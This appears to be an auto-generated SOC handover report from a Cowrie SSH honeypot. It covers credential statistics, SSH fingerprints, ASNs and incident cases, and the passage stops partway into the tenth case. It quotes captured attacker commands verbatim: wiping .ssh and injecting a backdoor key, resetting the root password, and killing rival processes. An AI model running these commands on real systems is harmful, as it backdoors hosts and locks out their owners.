# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-28 |
| **Generated At** | 2026-04-28T14:22:06Z |
| **Shift Time** | 14:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **120** |
| Confirmed Threats | **113** |
| False Positives Filtered | **7** (5.8%) |
| Unique Attacker IPs | **27** |
| Countries of Origin | **11** |
| High Severity Cases | **39** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **81** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **58** |
| Unique Credential Pairs | **21** |
| Unique Usernames | **2** |
| Unique Passwords | **21** |
| Successful Auth Pairs | **29** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 39 |
| `345gs5662d34` | 19 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 19 |
| `3245gs5662d34` | 19 |
| `crazyvps2` | 2 |
| `http` | 1 |
| `liyanfeng` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 19 |
| `root` | `3245gs5662d34` | 19 |
| `root` | `crazyvps2` | 2 |
| `root` | `http` | 1 |
| `root` | `liyanfeng` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `http` | `152.32.171.133` | 2026-04-28T10:19:51 |
| `root` | `3245gs5662d34` | `152.32.171.133` | 2026-04-28T10:19:54 |
| `root` | `crazyvps2` | `34.131.211.42` | 2026-04-28T10:24:36 |
| `root` | `3245gs5662d34` | `34.131.211.42` | 2026-04-28T10:24:38 |
| `root` | `liyanfeng` | `159.89.106.4` | 2026-04-28T10:37:57 |
| `root` | `3245gs5662d34` | `159.89.106.4` | 2026-04-28T10:38:03 |
| `root` | `crazyvps2` | `165.154.5.249` | 2026-04-28T10:41:14 |
| `root` | `3245gs5662d34` | `165.154.5.249` | 2026-04-28T10:41:19 |
| `root` | `123654re` | `180.76.143.203` | 2026-04-28T11:35:03 |
| `root` | `123456,.` | `106.13.181.42` | 2026-04-28T11:41:45 |
| `root` | `3245gs5662d34` | `106.13.181.42` | 2026-04-28T11:41:54 |
| `root` | `4rfv$RFV` | `106.13.181.42` | 2026-04-28T11:42:05 |
| `root` | `chanequa` | `106.13.181.42` | 2026-04-28T11:42:25 |
| `root` | `148` | `106.13.181.42` | 2026-04-28T11:42:43 |
| `root` | `[demo]` | `106.13.181.42` | 2026-04-28T11:43:25 |
| `root` | `1@#qazxsw2` | `106.13.181.42` | 2026-04-28T11:43:46 |
| `root` | `testing12345` | `106.13.181.42` | 2026-04-28T11:44:05 |
| `root` | `3ucl1d` | `106.13.181.42` | 2026-04-28T11:44:27 |
| `root` | `cusadmin` | `106.13.181.42` | 2026-04-28T11:44:49 |
| `root` | `mko` | `106.13.181.42` | 2026-04-28T11:45:10 |
| `root` | `1234Qwe` | `106.13.181.42` | 2026-04-28T11:46:01 |
| `root` | `123987` | `103.218.241.179` | 2026-04-28T11:53:07 |
| `root` | `3245gs5662d34` | `103.218.241.179` | 2026-04-28T11:53:10 |
| `root` | `root2026@` | `185.9.193.111` | 2026-04-28T12:05:30 |
| `root` | `3245gs5662d34` | `185.9.193.111` | 2026-04-28T12:05:36 |
| `root` | `r00t@123` | `60.199.224.55` | 2026-04-28T12:13:38 |
| `root` | `3245gs5662d34` | `60.199.224.55` | 2026-04-28T12:13:42 |
| `root` | `my_backups` | `20.193.141.133` | 2026-04-28T13:01:59 |
| `root` | `3245gs5662d34` | `20.193.141.133` | 2026-04-28T13:02:00 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **120** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 73 |
| Go SSH scanner | 3 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 47 | 5 |
| `af8223ac9914...` | libssh-based | 26 | 10 |
| `9052c4ab4164...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 47 | 5 | Modern SSH client |
| `af8223ac9914...` | libssh | 26 | 10 | libssh-based |
| `95420f9d932d...` | Go SSH scanner | 2 | 2 | — |
| `9052c4ab4164...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 19 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:med6ntvcYzea"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.143.203`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `60.199.224.55`, `159.89.106.4`, `152.32.171.133`, `34.131.211.42`, `185.9.193.111`, `165.154.5.249`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **27** |
| Unique ASNs | **20** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS198479` | Nunsys SA | 1 | HIGH |
| `AS14618` | Amazon.com, Inc. | 1 | HIGH |
| `AS63949` | Akamai Connected Cloud | 1 | LOW |
| `AS133774` | Fuzhou | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (39)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-610c8b264969

| Field | Detail |
|---|---|
| **Source IP** | `152.32.171[.]133` |
| **First Seen** | 2026-04-28 10:19 |
| **Last Seen** | 2026-04-28 10:19 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:19:50` | `cowrie.session.connect` |
| `2026-04-28 10:19:50` | `cowrie.client.version` |
| `2026-04-28 10:19:50` | `cowrie.client.kex` |
| `2026-04-28 10:19:51` | `cowrie.login.success` |
| `2026-04-28 10:19:51` | `cowrie.session.params` |
| `2026-04-28 10:19:51` | `cowrie.command.input` |
| `2026-04-28 10:19:51` | `cowrie.command.failed` |
| `2026-04-28 10:19:51` | `cowrie.log.closed` |
| `2026-04-28 10:19:51` | `cowrie.session.params` |
| `2026-04-28 10:19:51` | `cowrie.command.input` |
| `2026-04-28 10:19:51` | `cowrie.session.file_download` |
| `2026-04-28 10:19:51` | `cowrie.log.closed` |
| `2026-04-28 10:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.171[.]133` to AbuseIPDB if not already reported
- [ ] Block `152.32.171[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a212b0c881bb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.171[.]133` |
| **First Seen** | 2026-04-28 10:19 |
| **Last Seen** | 2026-04-28 10:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:19:53` | `cowrie.session.connect` |
| `2026-04-28 10:19:53` | `cowrie.client.version` |
| `2026-04-28 10:19:53` | `cowrie.client.kex` |
| `2026-04-28 10:19:54` | `cowrie.login.success` |
| `2026-04-28 10:19:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.171[.]133` to AbuseIPDB if not already reported
- [ ] Block `152.32.171[.]133` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9374cbc799

| Field | Detail |
|---|---|
| **Source IP** | `34.131.211[.]42` |
| **First Seen** | 2026-04-28 10:24 |
| **Last Seen** | 2026-04-28 10:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:24:36` | `cowrie.session.connect` |
| `2026-04-28 10:24:36` | `cowrie.client.version` |
| `2026-04-28 10:24:36` | `cowrie.client.kex` |
| `2026-04-28 10:24:36` | `cowrie.login.success` |
| `2026-04-28 10:24:36` | `cowrie.session.params` |
| `2026-04-28 10:24:36` | `cowrie.command.input` |
| `2026-04-28 10:24:36` | `cowrie.command.failed` |
| `2026-04-28 10:24:36` | `cowrie.log.closed` |
| `2026-04-28 10:24:36` | `cowrie.session.params` |
| `2026-04-28 10:24:36` | `cowrie.command.input` |
| `2026-04-28 10:24:36` | `cowrie.session.file_download` |
| `2026-04-28 10:24:36` | `cowrie.log.closed` |
| `2026-04-28 10:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.131.211[.]42` to AbuseIPDB if not already reported
- [ ] Block `34.131.211[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db8a0768a241

| Field | Detail |
|---|---|
| **Source IP** | `34.131.211[.]42` |
| **First Seen** | 2026-04-28 10:24 |
| **Last Seen** | 2026-04-28 10:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:24:38` | `cowrie.session.connect` |
| `2026-04-28 10:24:38` | `cowrie.client.version` |
| `2026-04-28 10:24:38` | `cowrie.client.kex` |
| `2026-04-28 10:24:38` | `cowrie.login.success` |
| `2026-04-28 10:24:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.131.211[.]42` to AbuseIPDB if not already reported
- [ ] Block `34.131.211[.]42` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e86d77b5e69

| Field | Detail |
|---|---|
| **Source IP** | `159.89.106[.]4` |
| **First Seen** | 2026-04-28 10:37 |
| **Last Seen** | 2026-04-28 10:38 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:37:56` | `cowrie.session.connect` |
| `2026-04-28 10:37:56` | `cowrie.client.version` |
| `2026-04-28 10:37:56` | `cowrie.client.kex` |
| `2026-04-28 10:37:57` | `cowrie.login.success` |
| `2026-04-28 10:37:58` | `cowrie.session.params` |
| `2026-04-28 10:37:58` | `cowrie.command.input` |
| `2026-04-28 10:37:58` | `cowrie.command.failed` |
| `2026-04-28 10:37:58` | `cowrie.log.closed` |
| `2026-04-28 10:37:58` | `cowrie.session.params` |
| `2026-04-28 10:37:58` | `cowrie.command.input` |
| `2026-04-28 10:37:58` | `cowrie.session.file_download` |
| `2026-04-28 10:37:58` | `cowrie.log.closed` |
| `2026-04-28 10:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.106[.]4` to AbuseIPDB if not already reported
- [ ] Block `159.89.106[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cdd3d6cbba0

| Field | Detail |
|---|---|
| **Source IP** | `159.89.106[.]4` |
| **First Seen** | 2026-04-28 10:38 |
| **Last Seen** | 2026-04-28 10:38 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:38:02` | `cowrie.session.connect` |
| `2026-04-28 10:38:02` | `cowrie.client.version` |
| `2026-04-28 10:38:02` | `cowrie.client.kex` |
| `2026-04-28 10:38:03` | `cowrie.login.success` |
| `2026-04-28 10:38:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.89.106[.]4` to AbuseIPDB if not already reported
- [ ] Block `159.89.106[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bad1b041bb6

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-28 10:41 |
| **Last Seen** | 2026-04-28 10:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:41:14` | `cowrie.session.connect` |
| `2026-04-28 10:41:14` | `cowrie.client.version` |
| `2026-04-28 10:41:14` | `cowrie.client.kex` |
| `2026-04-28 10:41:14` | `cowrie.login.success` |
| `2026-04-28 10:41:15` | `cowrie.session.params` |
| `2026-04-28 10:41:15` | `cowrie.command.input` |
| `2026-04-28 10:41:15` | `cowrie.command.failed` |
| `2026-04-28 10:41:16` | `cowrie.log.closed` |
| `2026-04-28 10:41:16` | `cowrie.session.params` |
| `2026-04-28 10:41:16` | `cowrie.command.input` |
| `2026-04-28 10:41:16` | `cowrie.session.file_download` |
| `2026-04-28 10:41:16` | `cowrie.log.closed` |
| `2026-04-28 10:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1793ccb8c02

| Field | Detail |
|---|---|
| **Source IP** | `165.154.5[.]249` |
| **First Seen** | 2026-04-28 10:41 |
| **Last Seen** | 2026-04-28 10:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 10:41:18` | `cowrie.session.connect` |
| `2026-04-28 10:41:18` | `cowrie.client.version` |
| `2026-04-28 10:41:18` | `cowrie.client.kex` |
| `2026-04-28 10:41:19` | `cowrie.login.success` |
| `2026-04-28 10:41:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.5[.]249` to AbuseIPDB if not already reported
- [ ] Block `165.154.5[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9144a820f9fb

| Field | Detail |
|---|---|
| **Source IP** | `180.76.143[.]203` |
| **First Seen** | 2026-04-28 11:35 |
| **Last Seen** | 2026-04-28 11:35 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:med6ntvcYzea"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-28 11:35:00` | `cowrie.session.connect` |
| `2026-04-28 11:35:00` | `cowrie.client.version` |
| `2026-04-28 11:35:02` | `cowrie.client.kex` |
| `2026-04-28 11:35:03` | `cowrie.login.success` |
| `2026-04-28 11:35:04` | `cowrie.session.params` |
| `2026-04-28 11:35:04` | `cowrie.command.input` |
| `2026-04-28 11:35:04` | `cowrie.command.failed` |
| `2026-04-28 11:35:05` | `cowrie.log.closed` |
| `2026-04-28 11:35:05` | `cowrie.session.params` |
| `2026-04-28 11:35:05` | `cowrie.command.input` |
| `2026-04-28 11:35:06` | `cowrie.session.file_download` |
| `2026-04-28 11:35:06` | `cowrie.log.closed` |
| `2026-04-28 11:35:22` | `cowrie.session.params` |
| `2026-04-28 11:35:22` | `cowrie.command.input` |
| `2026-04-28 11:35:22` | `cowrie.log.closed` |
| `2026-04-28 11:35:23` | `cowrie.session.params` |
| `2026-04-28 11:35:23` | `cowrie.command.input` |
| `2026-04-28 11:35:23` | `cowrie.log.closed` |
| `2026-04-28 11:35:24` | `cowrie.session.params` |
| `2026-04-28 11:35:24` | `cowrie.command.input` |
| `2026-04-28 11:35:25` | `cowrie.session.file_download` |
| `2026-04-28 11:35:25` | `cowrie.log.closed` |
| `2026-04-28 11:35:25` | `cowrie.session.params` |
| `2026-04-28 11:35:25` | `cowrie.command.input` |
| `2026-04-28 11:35:25` | `cowrie.log.closed` |
| `2026-04-28 11:35:26` | `cowrie.session.params` |
| `2026-04-28 11:35:26` | `cowrie.command.input` |
| `2026-04-28 11:35:26` | `cowrie.log.closed` |
| `2026-04-28 11:35:27` | `cowrie.session.params` |
| `2026-04-28 11:35:27` | `cowrie.command.input` |
| `2026-04-28 11:35:27` | `cowrie.command.input` |
| `2026-04-28 11:35:27` | `cowrie.log.closed` |
| `2026-04-28 11:35:28` | `cowrie.session.params` |
| `2026-04-28 11:35:28` | `cowrie.command.input` |
| `2026-04-28 11:35:28` | `cowrie.log.closed` |
| `2026-04-28 11:35:29` | `cowrie.session.params` |
| `2026-04-28 11:35:29` | `cowrie.command.input` |
| `2026-04-28 11:35:29` | `cowrie.log.closed` |
| `2026-04-28 11:35:30` | `cowrie.session.params` |
| `2026-04-28 11:35:30` | `cowrie.command.input` |
| `2026-04-28 11:35:30` | `cowrie.log.closed` |
| `2026-04-28 11:35:31` | `cowrie.session.params` |
| `2026-04-28 11:35:31` | `cowrie.command.input` |
| `2026-04-28 11:35:31` | `cowrie.log.closed` |
| `2026-04-28 11:35:32` | `cowrie.session.params` |
| `2026-04-28 11:35:32` | `cowrie.command.input` |
| `2026-04-28 11:35:32` | `cowrie.log.closed` |
| `2026-04-28 11:35:33` | `cowrie.session.params` |
| `2026-04-28 11:35:33` | `cowrie.command.input` |
| `2026-04-28 11:35:33` | `cowrie.log.closed` |
| `2026-04-28 11:35:34` | `cowrie.session.params` |
| `2026-04-28 11:35:34` | `cowrie.command.input` |
| `2026-04-28 11:35:34` | `cowrie.log.closed` |
| `2026-04-28 11:35:35` | `cowrie.session.params` |
| `2026-04-28 11:35:35` | `cowrie.command.input` |
| `2026-04-28 11:35:35` | `cowrie.log.closed` |
| `2026-04-28 11:35:36` | `cowrie.session.params` |
| `2026-04-28 11:35:36` | `cowrie.command.input` |
| `2026-04-28 11:35:36` | `cowrie.log.closed` |
| `2026-04-28 11:35:37` | `cowrie.session.params` |
| `2026-04-28 11:35:37` | `cowrie.command.input` |
| `2026-04-28 11:35:37` | `cowrie.log.closed` |
| `2026-04-28 11:35:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.143[.]203` to AbuseIPDB if not already reported
- [ ] Block `180.76.143[.]203` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c4c1e510bfbd

| Field | Detail |
|---|---|
| **Source IP** | `106.13.181[.]42` |
| **First Seen** | 2026-04-28 11:41 |
| **Last Seen** | 2026-04-28 11:41 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
